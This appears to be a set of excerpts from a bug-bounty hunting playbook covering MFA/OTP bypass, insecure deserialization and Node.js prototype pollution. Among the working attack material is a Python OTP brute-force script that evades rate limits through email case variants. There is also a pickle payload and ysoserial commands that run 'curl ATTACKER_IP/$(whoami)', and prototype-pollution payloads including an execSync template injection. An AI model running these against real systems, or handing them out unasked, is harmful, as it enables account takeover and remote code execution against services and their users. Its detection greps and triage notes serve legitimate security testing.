...
## 19. MFA / 2FA BYPASS
> Growing bug class — 9 distinct patterns. Pays High/Critical when it enables ATO without prior session.
...
### Pattern 8: Email Case Normalization Inconsistency (0-click ATO)
> Paid real bounty. 0 victim interaction. Full ATO via OTP brute force.

**Root cause:** Rate limiter keys on the raw email string (case-sensitive). Auth/OTP lookup normalizes with LOWER(email). These two functions disagree on identity.

**Attack math:**
```
Target email: admin@securecam.io  (16 alphabetic chars in local part)
Case variants: 2^16 = 65,536 unique strings all resolving to same account
Attempts per variant: 4 (before block)
Total attempts available: 65,536 x 4 = 262,144
OTP space (4 digits): 10,000
Coverage: 262,144 >> 10,000 → guaranteed brute force without hitting a single block
```
...
def case_variants(email):
    local, domain = email.split("@", 1)
    for bits in range(2 ** len(local)):
        variant = "".join(
            c.upper() if bits & (1 << i) else c.lower()
            for i, c in enumerate(local)
        )
        yield f"{variant}@{domain}"

def brute_otp(target_email, otp_url, attempts_per_variant=4):
    for otp in range(10000):
        for variant in itertools.islice(case_variants(target_email), attempts_per_variant):
            r = requests.post(otp_url, json={"email": variant, "otp": f"{otp:04d}"})
            if r.status_code == 200:
                print(f"[+] ATO: email={variant} otp={otp:04d}")
                return
```

**Detection signal:**
```bash
# Step 1: trigger OTP for target
POST /api/reset-password  {"email": "admin@target.com"}

# Step 2: exhaust rate limit on exact casing
POST /api/verify-otp  {"email": "admin@target.com", "otp": "0000"}  # x4 -> 429

# Step 3: try uppercase variant - should get fresh counter
POST /api/verify-otp  {"email": "Admin@target.com", "otp": "0000"}  # 200 or 400 (not 429) = VULNERABLE
```

**Where to look:**
- Password reset OTP / magic link flows
- Email verification on signup
- Any OTP tied to an email address as the rate limit key
- Targets using Node.js/Express (commonly use raw req.body.email as cache key)

**Impact:** EXTERNAL + EASY = Critical. Zero victim interaction. Attacker needs only the target email address.

**False positive check:** If rate limiter normalizes email before keying (lowercases it), all variants share one counter — not exploitable.

### Pattern 9: OTP Namespace Collision (Cross-Account OTP Reuse)
```
1. Attacker requests OTP for attacker@evil.com
2. Attacker sends OTP to /verify endpoint with victim@target.com in body
3. If OTP is validated globally (not scoped per email) → attacker's OTP unlocks victim's account
Test: generate your own OTP → submit it with a different email in the verify request
```

### MFA Chain Escalation
```
Rate limit bypass + no lockout = ATO (Critical)
Email case normalization bypass + 4-digit OTP = 0-click ATO (Critical)
...
> Highest severity web class — reliable unauthenticated RCE when gadget chains present.

### Root Cause
User-controlled bytes are deserialized back into objects without type/integrity validation. If the classpath contains gadget-rich libraries (commons-collections, spring-beans, xalan), attacker-crafted payloads trigger arbitrary code execution.
...
- `jsonpickle.decode()`, `torch.load()`, `joblib.load()`

**Java:**
- `ObjectInputStream.readObject()`, `XMLDecoder.readObject()`
- Jackson `ObjectMapper` with default typing enabled
- SnakeYAML `Yaml.load()` without safe constructor
- XStream without allowlist

**.NET:**
- `BinaryFormatter.Deserialize()` (deprecated, still common)
- `Json.NET` with `TypeNameHandling != None`
- `JavaScriptSerializer` with SimpleTypeResolver

**PHP:**
- `unserialize()` on any user input
- PHAR deserialization via `file_exists("phar://upload.phar")`

**Ruby:**
- `Marshal.load()`, `YAML.load()` (before Psych 4 safe default)

### Detection
```bash
# Scan for sinks in source code
grep -rn "pickle.loads\|yaml.load\|jsonpickle.decode\|torch.load" src/
grep -rn "ObjectInputStream\|XMLDecoder\|readObject" src/
grep -rn "unserialize\|PHAR" src/ --include="*.php"

# Java — check for gadget-rich libraries
grep -rE "commons-collections|spring-beans|xalan|bcel" pom.xml build.gradle
```
...
class RCE:
    def __reduce__(self):
        return (os.system, ('curl http://ATTACKER_IP/$(whoami)',))
print(base64.b64encode(pickle.dumps(RCE())).decode())
"

# Java — ysoserial gadget chains
java -jar ysoserial.jar CommonsCollections6 'curl http://ATTACKER_IP/rce' | base64 -w0
java -jar ysoserial.jar Spring1 'curl http://ATTACKER_IP/rce' | base64 -w0
# Try all: CommonsCollections1-7, Spring1, Spring2, Groovy1, C3P0
...
### Sources (where deserialized data enters)
- HTTP cookies containing serialized session objects
- `__viewstate` in ASP.NET forms
- Java deserialization over RMI/JMX/T3 (WebLogic, JBoss)
- HTTP body with `Content-Type: application/x-java-serialized-object`
- Message queues (Kafka, RabbitMQ) processing job data

### Triage
```
Java + ysoserial gadget chain on classpath → Critical RCE
Python pickle in cookie/header           → Critical RCE
PHP unserialize with phpggc chain        → Critical RCE
Gadget chain absent                      → Medium (may still allow object injection)
```

---

## 22. PROTOTYPE POLLUTION (JavaScript / Node.js)
> Meta-vulnerability: pollute Object.prototype once, trigger RCE/auth bypass everywhere in the runtime.

### Root Cause
JavaScript's prototype chain means every object inherits from `Object.prototype`. If a deep merge/clone function accepts user-controlled keys without filtering `__proto__`, `constructor`, or `prototype`, an attacker can add properties to `Object.prototype` that appear on ALL objects in the process.

### Dangerous Libraries
```bash
# Check for vulnerable merge libraries
jq '.dependencies,.devDependencies | to_entries[] | select(.key | test("lodash|merge|set-value|dot-prop|deepmerge|hoek"))' package.json
npm ls lodash set-value dot-prop 2>/dev/null | grep -E '[0-9]'
```

Known sinks:
- `lodash.merge()`, `lodash.defaultsDeep()`, `lodash.zipObjectDeep()`
- `jquery.extend(true, ...)` (deep extend only)
- `merge-deep`, `deepmerge`, `hoek.merge` (before fixes)
- `qs` query string parser (`?a[__proto__][x]=1`)
- `express-fileupload`, `dot-object`, `node-config`

### Sources
- JSON body parsed into nested objects
- Query strings via `qs` (default config parses nested keys)
- YAML uploads
- WebSocket messages
...
```javascript
// Plant the pollution via SSRF-like request body:
// POST /api/merge  {"__proto__":{"isAdmin":true}}

// Gadget 1 — auth bypass (most common)
// After pollution: {} -> Object.prototype.isAdmin = true
// Any check: if (user.isAdmin) → now passes for every user object

// Gadget 2 — RCE via child_process.spawn()
// POST /api/settings {"__proto__":{"shell":"/bin/bash"}}
// Any subsequent spawn() now executes args through bash shell

// Gadget 3 — template engines (Handlebars, EJS)
// POST /api/render {"__proto__":{"helpers":{"exec":"process.mainModule.require('child_process').execSync('id')"}}}

// Gadget 4 — lodash.template (if template source is user-controlled + __proto__ injectable)
// "__proto__":{"sourceURL":"..."}
```
...
```bash
# Body-based pollution
curl -s -X POST TARGET/api/endpoint \
    -H "Content-Type: application/json" \
    -d '{"__proto__":{"polluted":"yes"}}' | grep polluted

# Query string via qs
curl -s "TARGET/api/search?a%5B__proto__%5D%5Bpolluted%5D=yes"

# Check if polluted (need a way to observe an unexpected property)
curl -s TARGET/api/user/me | grep polluted   # look for extra keys in response
```

### Triage
```
__proto__ pollution + RCE gadget present (spawn/template)  → Critical
__proto__ pollution + auth bypass gadget                   → High/Critical
__proto__ pollution + DoS gadget                           → Medium
Pollution confirmed, no gadget identified yet              → Medium (needs chaining)
```
